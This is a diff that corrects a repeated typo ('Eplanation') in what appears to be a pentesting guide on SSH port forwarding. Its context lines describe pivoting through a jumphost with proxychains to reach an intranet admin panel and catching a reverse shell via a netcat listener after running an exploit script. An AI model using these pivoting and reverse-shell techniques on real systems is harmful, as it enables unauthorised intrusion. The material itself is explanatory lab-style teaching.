@@ -20,7 +20,7 @@ tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      
 ...
 ```
 
-**Eplanation:**
+**Explanation:**
 The first 3307 refers to opening a local port on your host machine. The 127.0.0.1:3306 refers to the remote host's service.
 This will create an SSH tunnel to relay connection to your host's port 3307 to the target service.
 
@@ -70,7 +70,7 @@ tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      
 ...
 ```
 
-**Eplanation:**
+**Explanation:**
 The first 8001 refers to opening a local port on your host machine. The 172.16.1.2:80 refers to the admin web panel located inside the intranet.
 This will create an SSH tunnel to relay connection to your host's port 8001 to the target service. This is very similar to Scenario 1 except this time, we specify a specific remote target which is the intranet admin panel instead of 127.0.0.1.
 
@@ -90,7 +90,7 @@ tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      
 ...
 ```
 
-**Eplanation:**
+**Explanation:**
 We first edit our proxychains configuration file to set a SOCKS proxy at 127.0.0.1:8001.
 Then, by using SSH dynamic port forwarding, we create a SOCKS proxy at port 8001 with the `-D` option.
 Next, we can process to prefix any CLI commands with proxychains that will route our requests through this SOCKS proxy and reach the admin panel.
@@ -118,7 +118,7 @@ tcp        0      0 172.16.1.100:9877       0.0.0.0:*               LISTEN      
 (host)# proxychains exploit.py --lhost=172.16.1.10 --lport=4444
 ```
 
-**Eplanation:**
+**Explanation:**
 I first start my own host's SSHd. I set a netcat listener at port 9999 to catch a reverse connection back on my host machine (10.10.1.32). 
 Inside my jumphost, I leverage the SSH client found inside to perform a Local Port Forwarding instead. Interesting fact: Local Port Forwarding allows us to set a binding address without requiring any special option being enabled on the jumphost's SSHd configuration unlike Remote Port Forwarding.
 I can either set my binding address to 172.16.1.10 or 0.0.0.0. This will create a port 4444 listener on our jumphost as seen in our netstat. I then set the remote address pointing to my host's netcat at 10.10.1.32:9999. We can then exploit the admin web portal to call a reverse connection to our jumphost at 172.16.1.10:4444 which will redirect back to our netcat listener, thus catching a reverse shell. 
